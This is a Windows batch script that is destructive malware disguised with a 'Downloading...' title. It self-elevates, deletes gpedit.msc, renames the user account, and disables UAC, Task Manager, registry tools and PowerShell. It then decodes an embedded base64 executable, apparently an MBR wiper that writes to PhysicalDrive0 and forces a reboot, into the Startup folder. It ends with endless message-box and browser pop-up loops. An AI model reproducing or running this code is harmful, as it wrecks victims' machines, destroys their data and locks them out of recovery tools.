
@echo off
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------

title Downloading...
setlocal
cd C:\Windows\System32
cls
set gpeditPath=C:\Windows\System32\gpedit.msc

cls
takeown /F "%gpeditPath%" /A

cls
icacls "%gpeditPath%" /reset
cls


icacls "%gpeditPath%" /grant USER:F
cls
timeout /t 1 /nobreak>nul
cls
del gpedit.msc
cls
title Loading...
cls
timeout /t 4 /nobreak>nul



:start
wmic useraccount where name='%username%' rename "YEEEEEEEEE"
title YEE
cls


timeout /t 1 /nobreak>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system" /v EnableLUA /t REG_DWORD /d 0 /f > nul
timeout /t 1 /nobreak>nul
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gpsvc" /v Demical /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSettings /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTaskGrouping /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v TaskbarNoResize /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileTypeAssistant /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoExplorer /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f>nul
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell" /v "EnableScripts" /t REG_DWORD /d 0 /f>nul
reg add "HKCU\Software\Policies\Microsoft\Windows\PowerShell" /v "EnableScripts" /t REG_DWORD /d 0 /f>nul
reg add "HKCU\Software\Policies\Microsoft\Windows\PowerShell" /v "EnableISE" /t REG_DWORD /d 0 /f>nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f>nul
set startupFolder="%USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup"
icacls %startupFolder% /deny %USERNAME%:(D)


cd %startupFolder%
echo Hello :D>yee.txt
timeout /t 1 /nobreak>nul
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v>>yee
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAM1WccAAAAAA>>yee
echo AAAAAOAAIgALATAAABYAAAAIAAAAAAAAHjQAAAAgAAAAQAAAAABAAAAgAAAAAgAA>>yee
echo BAAAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAIAYIUAABAAABAAAAAAEAAAEAAA>>yee
echo AAAAABAAAAAAAAAAAAAAAMwzAABPAAAAAEAAAHgFAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AGAAAAwAAAAUMwAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA>>yee
echo JBQAAAAgAAAAFgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAHgFAAAAQAAA>>yee
echo AAYAAAAYAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAHgAA>>yee
echo AAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAANAAAAAAAAEgAAAACAAUA>>yee
echo CCMAAFQPAAADAAIAAQAABlwyAAC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAFYAFigUAAAKACgVAAAKACgCAAAGJioAABswBACsAAAA>>yee
echo AQAAEQByAQAAcAoABhkYcxYAAAoLACAAAgAAjSQAAAEMFg0rDgAICSCQAAAAnAAJ>>yee
echo F1gNCQiOaf4EEwQRBC3mCBYg6wAAAJwIFyD+AAAAnAgYIJAAAACcCBkgkAAAAJwI>>yee
echo IP4BAAAfVZwIIP8BAAAgqgAAAJwHCBYIjmlvFwAACgByJwAAcCgDAAAGAADeCwcs>>yee
echo BwdvGAAACgDcFxMF3g8mABYTBd4IEwYAFhMF3gARBSoBKAAAAgARAHmKAAsAAAAA>>yee
echo AAAHAJOaAAcUAAABAAAHAJOhAAgTAAABGzAEAGMAAAACAAARAHMZAAAKJXJJAABw>>yee
echo bxoAAAoAJXJZAABwAigbAAAKbxwAAAoAJRdvHQAACgAlF28eAAAKACUWbx8AAAoA>>yee
echo JRdvIAAACgAKBighAAAKCwAHbyIAAAoAAN4LBywHB28YAAAKANwqAAEQAAACAEwA>>yee
echo C1cACwAAAAAiAigjAAAKACpeAhR9AQAABAIoJAAACgAAAigHAAAGACoAAAATMAIA>>yee
echo KwAAAAMAABEAAywLAnsBAAAEFP4DKwEWCgYsDgACewEAAARvGAAACgAAAgMoJQAA>>yee
echo CgAq3gACcyYAAAp9AQAABAIXKCcAAAoAAiAgAwAAIMIBAABzKAAACigpAAAKAAJy>>yee
echo YQAAcG8qAAAKAComAigjAAAKAAAqAAAAEzACADkAAAAEAAARAH4CAAAEFP4BCgYs>>yee
echo IgBybQAAcNAEAAACKCsAAApvLAAACnMtAAAKCweAAgAABAB+AgAABAwrAAgqAAAA>>yee
echo EzABAAsAAAAFAAARAH4DAAAECisABioiAAKAAwAABCoTMAEACwAAAAYAABEAfgQA>>yee
echo AAQKKwAGKiICKC4AAAoAKlZzDQAABigvAAAKdAUAAAKABAAABCoAAEJTSkIBAAEA>>yee
echo AAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAAQFAAAjfgAAcAUAAIgGAAAjU3Ry>>yee
echo aW5ncwAAAAD4CwAAvAAAACNVUwC0DAAAEAAAACNHVUlEAAAAxAwAAJACAAAjQmxv>>yee
echo YgAAAAAAAAACAAABVxWiAQkBAAAA+gEzABYAAAEAAAAwAAAABQAAAAQAAAAOAAAA>>yee
echo AwAAAC8AAAAWAAAABgAAAAIAAAADAAAABAAAAAEAAAAEAAAAAQAAAAAAMQMBAAAA>>yee
echo AAAGAIcC9wQGAPQC9wQGAKIBxQQPAFgFAAAGAOMBHAQGAGoCHAQGAEsCHAQGANsC>>yee
echo HAQGAKcCHAQGAMACHAQGAPoBHAQGAM8B2AQGAGAB2AQGAC4CHAQGABUCVQMGAOcF>>yee
echo yQMGADIByQMGALYDIQAGAEAEyQMGAC4EyQMKAFYExQQKAL8FxQQOANADnwUKAJME>>yee
echo jwMKAG4BewQGAIUBxQQGAEUB9wQGAGsEFwUGAEoEBwQKABcBjwMKALYBjwMKAPcA>>yee
echo 8gMOAOYDnwUGAIQAIQAGALQFIQAGACYDyQMGALoDIQAGAI0AyQMGAG8DyQMKAJQE>>yee
echo jwMOAKUDnwUOAHYAnwUSAFADgAMOAK4DnwUGAMoAyQMGAJkAyQMGAH0GHAQKAAIB>>yee
echo 8gMAAAAAGAAAAAAAAQABAAAAEADBAwAAQQABAAEAAQAQAAEABwBdAAEABQAAABAA>>yee
echo HgVnBUEAAgAIAAABEACWBWcFgQAEAAwAAQDVBb8AEQDVA8MAEQDnAMcAEQBiAMsA>>yee
echo UCAAAAAAkQDhAysAAQBoIAAAAACRACsAzwABAEghAAAAAJEASwDTAAEAyCEAAAAA>>yee
echo hhi4BAYAAgDRIQAAAACGGLgEBgACAOwhAAAAAMQADwEVAAIAIyIAAAAAgQAoBgYA>>yee
echo AwBbIgAAAACDGLgEBgADAGgiAAAAAJMIZwTYAAMAsCIAAAAAkwjPAN0AAwDHIgAA>>yee
echo AACTCNsA4gADANAiAAAAAJYI+gXoAAQA5yIAAAAAhhi4BAYABADwIgAAAACRGL4E>>yee
echo KwAEAAAAAQBaAAAAAQB2AwAAAQArAwkAuAQBABEAuAQGABkAuAQKACkAuAQQADEA>>yee
echo uAQQADkAuAQQAEEAuAQQAEkAuAQQAFEAuAQQAFkAuAQQAGEAuAQVAGkAuAQQAHEA>>yee
echo uAQQAHkAuAQQAIkAuAQGAMkAuAQaANEAuAQGANkAuAQGAPkAuAQgAAkBBgYmAAkB>>yee
echo gwUrAJEAuAQ8ACkBLAFHADEBDwEGAKkAuAQGAKkAvQAQADkB4AVWAKkAxwUQAKkA>>yee
echo QgYVAKkAngQVAKkAEgMVAKkAZgYVALEAPAZcALEA7gUGAIEAuAQGALkAuAQGALkA>>yee
echo DwEVAEEBuAQGAEkBcgBnAFkBuARuALkARgN0AGEBXQYQAGkBqwCDAGkBeQaMAOEA>>yee
echo uASSAAEBuAQGAIEBPgCkACAAewDmASkAmwCGAi4ACwD8AC4AEwAFAS4AGwAkAS4A>>yee
echo IwAtAS4AKwBDAS4AMwBDAS4AOwBDAS4AQwAtAS4ASwBJAS4AUwBDAS4AWwBDAS4A>>yee
echo YwBhAS4AawCLAS4AcwCYAUkAmwCGAoMAgwDrAYMAiwDmAYMAkwDmAaMAkwDmAaMA>>yee
echo gwAsAi8ATwBjAHsAmgCfAAQAAQAFAAMAAABrBO0AAADvAPIAAAAgBvcAAgAJAAMA>>yee
echo AgAKAAUAAQALAAUAAgAMAAcABIAAAAEAAAAAAAAAAAAAAAAABwAAAAQAAAAAAAAA>>yee
echo AAAAAK0ANQAAAAAABAAAAAAAAAAAAAAArQDJAwAAAAAEAAAAAAAAAAAAAACtAJ8F>>yee
echo AAAAAAQAAAAAAAAAAAAAALYAgAMAAAAAAAAAAAEAAAAoBQAAAAAAAABGb3JtMQBX>>yee
echo aW5kb3dzRm9ybXNBcHAxADxNb2R1bGU+AFN5c3RlbS5JTwBNb2RpZnlNQlIAbXNj>>yee
echo b3JsaWIAU3luY2hyb25pemVkAEV4ZWN1dGVDb21tYW5kAGNvbW1hbmQAZGVmYXVs>>yee
echo dEluc3RhbmNlAHNldF9BdXRvU2NhbGVNb2RlAEZpbGVNb2RlAElEaXNwb3NhYmxl>>yee
echo AFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAHNldF9GaWxlTmFt>>yee
echo ZQBUeXBlAGdldF9DdWx0dXJlAHNldF9DdWx0dXJlAHJlc291cmNlQ3VsdHVyZQBB>>yee
echo cHBsaWNhdGlvblNldHRpbmdzQmFzZQBEaXNwb3NlAEVkaXRvckJyb3dzYWJsZVN0>>yee
echo YXRlAFdyaXRlAFNUQVRocmVhZEF0dHJpYnV0ZQBDb21waWxlckdlbmVyYXRlZEF0>>yee
echo dHJpYnV0ZQBHdWlkQXR0cmlidXRlAEdlbmVyYXRlZENvZGVBdHRyaWJ1dGUARGVi>>yee
echo dWdnZXJOb25Vc2VyQ29kZUF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAEVk>>yee
echo aXRvckJyb3dzYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2Vt>>yee
echo Ymx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFy>>yee
echo Z2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1>>yee
echo dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3Jp>>yee
echo cHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBB>>yee
echo c3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1>>yee
echo dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5>>yee
echo QXR0cmlidXRlAHNldF9Vc2VTaGVsbEV4ZWN1dGUAQnl0ZQB2YWx1ZQBXaW5kb3dz>>yee
echo Rm9ybXNBcHAxLmV4ZQBzZXRfQ2xpZW50U2l6ZQBTeXN0ZW0uUnVudGltZS5WZXJz>>yee
echo aW9uaW5nAFN0cmluZwBkaXNwb3NpbmcAU3lzdGVtLkRyYXdpbmcAU3lzdGVtLkNv>>yee
echo bXBvbmVudE1vZGVsAENvbnRhaW5lckNvbnRyb2wARmlsZVN0cmVhbQBQcm9ncmFt>>yee
echo AFN5c3RlbQBGb3JtAHJlc291cmNlTWFuAE1haW4AQXBwbGljYXRpb24AU3lzdGVt>>yee
echo LkNvbmZpZ3VyYXRpb24AU3lzdGVtLkdsb2JhbGl6YXRpb24AU3lzdGVtLlJlZmxl>>yee
echo Y3Rpb24AVW5hdXRob3JpemVkQWNjZXNzRXhjZXB0aW9uAEN1bHR1cmVJbmZvAFBy>>yee
echo b2Nlc3NTdGFydEluZm8AZ2V0X1Jlc291cmNlTWFuYWdlcgBTeXN0ZW0uQ29kZURv>>yee
echo bS5Db21waWxlcgBJQ29udGFpbmVyAHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IA>>yee
echo LmN0b3IALmNjdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5J>>yee
echo bnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBT>>yee
echo eXN0ZW0uUmVzb3VyY2VzAFdpbmRvd3NGb3Jtc0FwcDEuUHJvcGVydGllcy5SZXNv>>yee
echo dXJjZXMucmVzb3VyY2VzAERlYnVnZ2luZ01vZGVzAFdpbmRvd3NGb3Jtc0FwcDEu>>yee
echo UHJvcGVydGllcwBFbmFibGVWaXN1YWxTdHlsZXMAU2V0dGluZ3MAU3lzdGVtLldp>>yee
echo bmRvd3MuRm9ybXMARmlsZUFjY2VzcwBQcm9jZXNzAHNldF9Bcmd1bWVudHMAY29t>>yee
echo cG9uZW50cwBDb25jYXQAT2JqZWN0AFdhaXRGb3JFeGl0AGdldF9EZWZhdWx0AFNl>>yee
echo dENvbXBhdGlibGVUZXh0UmVuZGVyaW5nRGVmYXVsdABJbml0aWFsaXplQ29tcG9u>>yee
echo ZW50AFN0YXJ0AHNldF9SZWRpcmVjdFN0YW5kYXJkT3V0cHV0AHNldF9UZXh0AHNl>>yee
echo dF9DcmVhdGVOb1dpbmRvdwBnZXRfQXNzZW1ibHkAAAAAJVwAXAAuAFwAUABoAHkA>>yee
echo cwBpAGMAYQBsAEQAcgBpAHYAZQAwAAAhcwBoAHUAdABkAG8AdwBuACAALQByACAA>>yee
echo LQB0ACAAMAABD2MAbQBkAC4AZQB4AGUAAAcvAEMAIAAAC0YAbwByAG0AMQAAS1cA>>yee
echo aQBuAGQAbwB3AHMARgBvAHIAbQBzAEEAcABwADEALgBQAHIAbwBwAGUAcgB0AGkA>>yee
echo ZQBzAC4AUgBlAHMAbwB1AHIAYwBlAHMAAAAAAK7X6VcuDYVBu6AjcGEKuhwABCAB>>yee
echo AQgDIAABBSABARERBCABAQ4EIAEBAgUgAgEODgUgAQEReQQAAQECAwAAAQwHBw4S>>yee
echo SR0FCAICEk0KIAMBDhGAiRGAjQcgAwEdBQgIBgcCElUSWQUAAg4ODgYAARJZElUD>>yee
echo BwECBiABARGAqQUgAgEICAYgAQERgK0HBwMCEnEScQgAARKAtRGAuQUgABKAvQcg>>yee
echo AgEOEoC9BAcBEnUEBwESFAgAARKAwRKAwQi3elxWGTTgiQiwP19/EdUKOgMGEmED>>yee
echo BhJxAwYSdQMGEhQDAAACBAABAQ4EAAAScQQAABJ1BQABARJ1BAAAEhQECAAScQQI>>yee
echo ABJ1BAgAEhQIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MB>>yee
echo CAEABwEAAAAAFQEAEFdpbmRvd3NGb3Jtc0FwcDEAAAUBAAAAABcBABJDb3B5cmln>>yee
echo aHQgwqkgIDIwMjQAACkBACQyMTY5OWQwZC05YmRkLTQzZGQtOGFmMC1jYjA0NmJj>>yee
echo MWMxNGEAAAwBAAcxLjAuMC4wAABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0>>yee
echo LjcuMgEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUULk5FVCBGcmFtZXdvcmsgNC43>>yee
echo LjIEAQAAAEABADNTeXN0ZW0uUmVzb3VyY2VzLlRvb2xzLlN0cm9uZ2x5VHlwZWRS>>yee
echo ZXNvdXJjZUJ1aWxkZXIHNC4wLjAuMAAAWQEAS01pY3Jvc29mdC5WaXN1YWxTdHVk>>yee
echo aW8uRWRpdG9ycy5TZXR0aW5nc0Rlc2lnbmVyLlNldHRpbmdzU2luZ2xlRmlsZUdl>>yee
echo bmVyYXRvcggxMS4wLjAuMAAACAEAAgAAAAAAALQAAADOyu++AQAAAJEAAABsU3lz>>yee
echo dGVtLlJlc291cmNlcy5SZXNvdXJjZVJlYWRlciwgbXNjb3JsaWIsIFZlcnNpb249>>yee
echo NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1>>yee
echo NjE5MzRlMDg5I1N5c3RlbS5SZXNvdXJjZXMuUnVudGltZVJlc291cmNlU2V0AgAA>>yee
echo AAAAAAAAAAAAUEFEUEFEULQAAAAAAAAAtxBZ0wAAAAACAAAAgAAAAEwzAABMFQAA>>yee
echo AAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAFJTRFPDUNlPKyEyTYW/8ONsxKxo>>yee
echo AQAAAEM6XFVzZXJzXOuCmOuKlCDsspzsnqzri6Rcc291cmNlXHJlcG9zXFdpbmRv>>yee
echo d3NGb3Jtc0FwcDFcV2luZG93c0Zvcm1zQXBwMVxvYmpcRGVidWdcV2luZG93c0Zv>>yee
echo cm1zQXBwMS5wZGIA9DMAAAAAAAAAAAAADjQAAAAgAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAA0AAAAAAAAAAAAAAAAX0NvckV4ZU1haW4AbXNjb3JlZS5kbGwAAAAAAP8l>>yee
echo ACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAACABAAAAAgAACAGAAAAFAAAIAAAAAAAAAAAAAAAAAAAAEA>>yee
echo AQAAADgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAEA>>yee
echo AQAAAGgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAOwDAACQQAAAXAMAAAAAAAAAAAAA>>yee
echo XAM0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEA>>yee
echo AAABAAAAAAAAAAEAAAAAAD8AAAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAA>>yee
echo AQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEA>>yee
echo dABpAG8AbgAAAAAAAACwBLwCAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYA>>yee
echo bwAAAJgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0AZQBuAHQA>>yee
echo cwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAABKABEA>>yee
echo AQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAVwBpAG4AZABvAHcA>>yee
echo cwBGAG8AcgBtAHMAQQBwAHAAMQAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkA>>yee
echo bwBuAAAAAAAxAC4AMAAuADAALgAwAAAASgAVAAEASQBuAHQAZQByAG4AYQBsAE4A>>yee
echo YQBtAGUAAABXAGkAbgBkAG8AdwBzAEYAbwByAG0AcwBBAHAAcAAxAC4AZQB4AGUA>>yee
echo AAAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkA>>yee
echo cgBpAGcAaAB0ACAAqQAgACAAMgAwADIANAAAACoAAQABAEwAZQBnAGEAbABUAHIA>>yee
echo YQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAUgAVAAEATwByAGkAZwBpAG4AYQBsAEYA>>yee
echo aQBsAGUAbgBhAG0AZQAAAFcAaQBuAGQAbwB3AHMARgBvAHIAbQBzAEEAcABwADEA>>yee
echo LgBlAHgAZQAAAAAAQgARAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABXAGkA>>yee
echo bgBkAG8AdwBzAEYAbwByAG0AcwBBAHAAcAAxAAAAAAA0AAgAAQBQAHIAbwBkAHUA>>yee
echo YwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMA>>yee
echo ZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAD8QwAA>>yee
echo eAEAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgi>>yee
echo ID8+DQo8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206>>yee
echo YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDx0cnVzdEluZm8geG1s>>yee
echo bnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2Vj>>yee
echo dXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJl>>yee
echo cXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJyZXF1aXJlQWRtaW5pc3RyYXRv>>yee
echo ciIgdWlBY2Nlc3M9ImZhbHNlIiAvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxl>>yee
echo Z2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJs>>yee
echo eT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo ADAAAAwAAAAgNAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>yee
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=                    >>yee
timeout /t 1 /nobreak>nul
certutil -decode yee yee.exe
timeout /t 1 /nobreak>nul
cd %userprofile%\desktop
cd %userprofile%\Onedrive\desktop

cls

for /l %%i in (1,1,100) do (
    echo 100>%%i.txt
)




echo msgbox "32767",16,"32767">>DLB.vbs
:DLB
start DLB.vbs
start msedge "https://www.google.com/search?q=32767"
goto DLB
